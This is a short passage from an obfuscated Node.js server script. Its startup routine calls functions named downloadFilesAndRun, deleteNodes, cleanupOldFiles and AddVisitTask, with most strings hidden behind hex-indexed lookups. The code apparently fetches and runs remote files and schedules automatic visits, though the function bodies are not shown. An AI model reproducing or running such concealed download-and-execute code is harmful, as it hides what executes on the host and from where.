console[_0x2be8da(0x115)]('automatic\x20access\x20task\x20added\x20successfully'),_0x167101;}catch(_0x5559d4){return console[_0x2be8da(0x12b)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5559d4['message']),null;}}async function startserver(){const _0x2bf574=_0x4c95a6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x130659){console[_0x2bf574(0x12b)](_0x2bf574(0x11b),_0x130659);}}function _0x27a5(_0x36e5b5,_0x415f06){_0x36e5b5=_0x36e5b5-0x10f;const _0x49b37f=_0x49b3();let _0x27a5d3=_0x49b37f[_0x36e5b5];return _0x27a5d3;}startserver()[_0x4c95a6(0x110)](_0x2ae9cb=>{const _0x4133d4=_0x4c95a6;console['error'](_0x4133d4(0x1b6),_0x2ae9cb);}),app[_0x4c95a6(0x1af)](PORT,()=>console[_0x4c95a6(0x115)](_0x4c95a6(0x13d)+PORT+'!'));
